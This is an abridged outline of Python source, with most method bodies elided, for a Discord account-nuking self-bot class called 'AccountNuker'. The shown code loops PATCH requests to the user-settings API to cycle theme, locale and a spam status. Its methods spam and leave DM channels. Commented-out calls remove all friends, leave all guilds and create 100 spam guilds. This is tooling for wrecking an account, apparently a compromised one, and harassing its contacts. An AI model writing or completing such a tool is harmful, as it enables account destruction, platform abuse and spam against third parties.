    ...
    async def start(self) -> None:
        ...
        async with aiohttp.ClientSession() as session:
            while not self.account.is_closed():
                ...
                payload = {"theme": next_theme, 'locale': next_language, 'status': 'online', "custom_status": {"text": message_to_spam}}
                await session.patch('https://discord.com/api/v8/users/@me/settings', json=payload,
...
class AccountNuker(commands.Bot):
    ...
    async def leave_private_channel(self, channel: Union[discord.DMChannel, discord.GroupChannel], message_to_spam: str) -> None:
        """
        |coro|
        ...
        if isinstance(channel, discord.DMChannel):
            try:
                ...
                self.format_message(Fore.RED, "Error when sending message to DMChannel", str(e))
    ...
    async def nuke(self):
        ...
        # await asyncio.gather(*[self.remove_friend(friend) for friend in self.user.friends])
        # await asyncio.gather(*[self.leave_private_channel(channel, message_to_spam) for channel in self.private_channels])
        # await asyncio.gather(*[self.leave_guild(guild) for guild in self.guilds])
        # await asyncio.gather(*[self.create_spam_guild(message_to_spam, avatar) for i in range(100)])
